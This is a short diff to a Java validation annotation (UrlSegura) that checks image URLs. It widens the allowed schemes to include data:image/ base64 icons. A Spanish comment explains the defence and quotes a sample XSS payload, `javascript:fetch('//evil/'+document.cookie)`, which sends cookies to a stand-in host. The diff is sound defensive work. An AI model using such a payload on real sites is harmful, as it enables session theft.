@@ -13,7 +13,8 @@ import jakarta.validation.Payload;
 
 /**
  * A03: la URL acaba en un atributo `src` del navegador, así que solo se admiten
- * http, https o una ruta del propio sitio.
+ * http, https, una ruta del propio sitio o un `data:image/` (base64) de un
+ * ícono subido desde el panel.
  *
  * Sin esto, un administrador (o cualquiera que consiga su token) podía guardar
  * `javascript:fetch('//evil/'+document.cookie)` como imagen de producto. Angular
@@ -30,7 +31,7 @@ import jakarta.validation.Payload;
 @Retention(RetentionPolicy.RUNTIME)
 public @interface UrlSegura {
 
-    String message() default "La URL debe empezar por http://, https:// o /";
+    String message() default "La URL debe empezar por http://, https://, / o data:image/";
 
     Class<?>[] groups() default {};
 
